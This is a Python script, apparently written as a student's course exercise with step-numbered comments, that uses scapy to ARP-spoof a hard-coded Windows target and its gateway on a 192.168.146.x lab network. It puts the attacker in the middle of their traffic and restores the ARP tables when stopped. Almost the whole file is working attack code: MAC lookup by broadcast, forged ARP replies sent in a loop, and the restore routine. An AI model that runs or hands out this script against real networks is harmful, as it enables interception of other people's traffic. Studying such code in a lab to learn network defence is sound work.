#!usr/bin/env python

import scapy.all as scapy
import time
import sys

# step 1 set op=2 means arp response not request.
# pdst=target ip, hwdst=target MAC address, psrc=router or gateway. in kali use route -n to find router.
# this packet makes W10 think it's talking to router.
# packet=scapy.ARP(op=2, pdst="192.168.146.142", hwdst="00:0c:29:5b:2f:2a", psrc="192.168.146.2")
# scapy.send(packet)
# used after/in step 1 to check info.
# print(packet.show())
# print(packet.summary())


# step 2 is making step 1 into a function and inserting the arguments/inputs.
# also implement a part of network_scanner. scan ip to get the target MAC address.


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # though answered and unanswered appear, this will select only the first indices or the answered.

    return answered_list[0][1].hwsrc

    # clients_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     clients_list.append(client_dict)
    # return clients_list


# step 5 adding verbose=false to scapy send create variable below sent packets count and print packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# step 8 will be restoration
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )  # need this last field to set mac address back to source ip.
    scapy.send(packet, count=4, verbose=False)


restore("192.168.146.142", "192.168.146.2")

# step 4 introduce while loop to keep packets rolling until attack is stopped
sent_packets_count = 0

target_ip = "192.168.146.142"
gateway_ip = "192.168.146.2"

# step 7 try/except statements.
try:
    while True:
        # step 3 tell target ip that , i am router ip
        spoof(target_ip, gateway_ip)
        # step tell router ip, i am target ip
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print(
            "\r[+] Packets sent: " + str(sent_packets_count)
        ),  # end="") #python3 move comma inside paren end="" no sys import or bottom.
        # step 6 is adding comma to have it print on 1 line.
        sys.stdout.flush()  # step 6 is flushing the buffer where Python won't print until program stops. import sys
        time.sleep(2)  # need to import time.
except KeyboardInterrupt:
    print("[+] Detected CTRL + C..........Resetting ARP tables......Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
# ctrl+c to stop
